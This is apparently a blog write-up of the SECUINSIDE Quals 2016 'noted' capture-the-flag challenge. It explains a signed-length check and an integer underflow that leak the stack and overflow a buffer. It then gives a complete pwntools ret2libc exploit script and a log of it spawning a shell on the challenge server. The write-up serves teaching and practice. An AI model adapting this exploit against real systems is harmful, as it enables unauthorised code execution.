---
layout: post
title: SECUINSIDE Quals 2016 - Noted
category: [Exploitation]
tags: [Exploitation, SECUINSIDE]
comments: true
---

**Points:** 180
**Solves:** 19
**Category:** Exploitation
**Description:** get shell and execute /flag_x

> [noted]({{site.url}}/assets/secu-noted)
> [libc]({{site.url}}/assets/secu-libc)

{% highlight text %} 
gdb-peda$ checksec
CANARY    : disabled
FORTIFY   : disabled
NX        : ENABLED
PIE       : ENABLED
RELRO     : Partial
gdb-peda$
{% endhighlight %}

This challenge is a binary in a form of note keeping application. On start it changes directory to `/home/noted` and presents the user with a menu.
{% highlight text %}
[Simple NOTED]
Menu
1) Login
2) Register
3) Exit

{% endhighlight %}

Before login, we need to register an account. On registration the application creates a folder with the provided user id. For the password it creates a file in the new directory, password.txt that only contains plaintext ASCII password for this user.

Once we login a different menu is presented.

{% highlight text %}
Menu
1) List note
2) Write note
3) Read note
4) Edit note
5) Delete note
6) Recover note
7) Empty recyclecan
8) Logout

{% endhighlight %}

## Main menu

Let's go a short description of all the functions in the application.

1. `List note` displays the notes the user has created
2. `Write note` is how a user creates a note. Each note creates a file in the user's designated directory, each file/note starts with 16 bytes serving as a password for that note followed by a maximum of 1024 bytes of note's content.
3. `Read note` reads a note
4. `Edit note` edits a note
5. `Delete note` deletes a note by moving the note/file in a subdirectory named `recyclecan`
6. `Recover note` moves a deleted note from the recyclebin directory back to the user's main folder
7. `Empty recyclecan` deletes all files/notes in the recyclecan folder
8. `Logout` logs out by setting a local variable in main and presents the login menu

To exploit the application we only need to know the `Write note` and `Edit note` functions.

## Write note

It's going to be easier if I just show the decompiled psudo-code.
What we need to do here is, create a note with arbitrary name and password and a negative content length. The goal is to create a note with it's content only it's password.

{% highlight C %}
int write_note()
{
  int result;
  int v1;
  int n;
  int fd;
  int fda;
  int length;
  char temp_buf[16];
  char content[1024];
  char title[136];  // note name / file name

  memset(title, 0, 0x80);
  memset(content, 0, 0x400);
  memset(temp_buf, 0, 0x10);
  printf("title : ");
  title[read(0, title, 0x80) - 1] = 0;  // null terminates our input
  if ( check_alphanum(title) )
  {
    fd = open(title, 0);
    printf("filedata length : ");
    temp_buf[read(0, temp_buf, 0x10) - 1] = 0;
    length = atoi(temp_buf);  // Here we need to supply negative number
    if ( length > 1023 )      // length is signed        
      length = 0;
    memset(temp_buf, 0, 0x10);
    printf("password : ");
    temp_buf[read(0, temp_buf, 0x10) - 1] = 0;
    if ( length > 0 )       // negative length prevents us from
    {                       // writing to the content buffer :(
      printf("filedata : ");
      v1 = read(0, content, length + 1);
      n = v1 - 1;
      content[v1] = 0;
    }
    if ( fd == -1 )
    {
      fda = open(title, 65, 438); // creates note
      write(fda, temp_buf, 0x10); // writes note's password to the note
      if ( length <= 0 )          // we need negative length here
      {                         
        if ( !length )            // negative length prevents "(EMPTY)"
          write(fda, "(EMPTY)", 7); // to be written to the note
      }
      else
      {
        write(fda, content, n);
      }
      close(fda);      // our note's content is only it's 16 byte password ! 
    }
    else
    {
      puts("error : filename duplicate!\n");
      close(fd);
    }
    result = write(1, "\n", 1);
  }
  else
  {
    result = puts("error : alphanum only!\n");
  }
  return result;
}
{% endhighlight %}

The check if length is negative before writing to the note is preventing us from supplying data to the note, however by creating a note with it's content only it's password we can trigger an integer underflow in `Edit note`.

## Edit note

{% highlight C %}
int edit_note()
{
  int result;
  int v1;
  int file_length;
  int note_fd;
  int n;
  char temp_buf[16];
  char password[16];
  char note_content[1024];
  char title[136];

  memset(title, 0, 0x80);
  memset(note_content, 0, 0x400);
  memset(password, 0, 0x10);
  memset(temp_buf, 0, 0x10);

  printf("title : ");
  title[read(0, title, 0x80) - 1] = 0;

  if ( check_alphanum(title) )
  {
    if ( check_file_stats(title, &v1) == -1 )
    {
      result = puts("error : invalid note\n");
    }
    else
    {
      // asks user for password
      memset(temp_buf, 0, 0x10);
      printf("password : ");
      temp_buf[read(0, temp_buf, 0x10) - 1)] = 0;
      password = temp_buf;
      note_fd = open(title, 0);
      if ( note_fd == -1 )
      {
        result = puts("error : cannot open note\n");
      }
      else
      {
        // read the passwd from the note
        read(note_fd, temp_buf, 0x10);
        // compare the two passwords
        if ( !memcmp(password, local_buf, 0x10) ) // 
        {
          if ( file_length - 16 <= 1024 )
          {
            // since the note's content is only it's password
            // the length of the note will be 16
            // calculating 16 - 16 - 1 will result it n being -1 via int underflow vuln
            n = read(note_fd, note_content, file_length - 16) - 1; // integer underflow here
            note_content[n] = 0;
            close(note_fd);

            // Here write will leak the whole content of the stack !
            printf("original data : ");
            write(1, note_content, n);
            note_fd = open(title, 1);

            // and here we have buffer overflow of the note_content local buffer
            printf("new file data (new file can't exceed original size) : ");
            n = read(0, note_content, n) - 1;
            note_content[n] = 0;
            write(note_fd, &local_buf, 0x10);
            write(note_fd, note_content, n);
            close(note_fd);
          }
          else
          {
            puts("error : note is too big\n");
          }
        }
        else
        {
          puts("error : incorrect password\n");
        }
        result = close(note_fd);
      }
    }
  }
  else
  {
    result = puts("error : alphanum only!\n");
  }
  return result;
}
{% endhighlight %}

If you read the comments, you pretty much know what needs to be done in order to exploit this function.
So let's create a username, login and create a note with length -1. Then go into `Edit note` and edit our note. This will cause the leak of the whole stack, that's where we are going to grab an address within libc calculate the offset to `system()` and `/bin/sh` string and classically overwrite the return address of the `Edit note`. 

## Exploit

{% highlight python %}
#!/usr/bin/env python

from pwn import *
import sys

def register(user, pwd):
  r.sendline('2')
  r.recvuntil('userid : ')
  r.sendline(user)
  r.recvuntil('userpw : ')
  r.sendline(pwd)
  r.recvuntil('3) Exit\n')

def login(user, pwd):
  r.sendline('1')
  r.recvuntil('userid : ')
  r.sendline(user)
  r.recvuntil('userpw : ')
  r.sendline(pwd)
  r.recvuntil('Menu\n')

def create_note(title):
  r.sendline('2')
  r.recvuntil('title : ')
  r.sendline(title)
  r.recvuntil('filedata length : ')
  r.sendline('-1')
  r.recvuntil('password : ')
  r.send("\n")
  r.recvuntil('8) Logout')

def edit_note(title):
  r.sendline('4')
  r.recvuntil('title : ')
  r.sendline(title)
  r.recvuntil('password : ')
  r.send("\n")
  r.recvuntil('original data : ')
  leak = r.recv(0x4cc)
  libc_addr = u32(r.recv(4)) - 0x00018637 # local 0x19af3
  leak = r.recv()
  log.info("libc addr" + hex(libc_addr))
  bin_sh = libc_addr + 0x15909f     # local 0x16084c remote 0x15909f
  system_addr = libc_addr + 0x0003a920  # local 0x40310 remote 0x3a920
  log.info("/bin/sh at: " + hex(bin_sh))
  log.info("system at: " + hex(system_addr))

  payload = "A" * 0x48c
  payload += p32(system_addr)
  payload += p32(bin_sh) * 2
  r.sendline(payload)

def exploit(r):
  r.recvuntil('3) Exit\n')

  user = 'uafioas'
  pswd = 'uafioas'

  register(user, pswd)
  login(user, pswd)
  create_note('ab')
  edit_note('ab')

  r.interactive()


if __name__ == "__main__":
    log.info("For remote: %s HOST PORT" % sys.argv[0])
    if len(sys.argv) > 1:
        r = remote(sys.argv[1], int(sys.argv[2]))
        exploit(r)
    else:
        r = process(['/vagrant/secuinside/noted/noted'])
        print util.proc.pidof(r)
        pause()
        exploit(r)
{% endhighlight %}

{% highlight text %}
➜  noted python ./noted.py chal.cykor.kr 20003
[*] For remote: ./noted.py HOST PORT
[+] Opening connection to chal.cykor.kr on port 20003: Done
[*] libc addr0xf75c4000
[*] /bin/sh at: 0xf771d09f
[*] system at: 0xf75fe920
[*] Switching to interactive mode
new file data (new file can't exceed original size) : $
$ ls /
bin
boot
core
dev
etc
flag_x
home
lib
lib32
lib64
media
mnt
noted
opt
proc
root
run
sbin
srv
sys
tmp
usr
var
$ /flag_x
df72b22170fed79911e4a69c68a1b9a0
$ id
uid=1000(noted) gid=1000(noted) groups=1000(noted)
$ whoami
noted
$
{% endhighlight %}
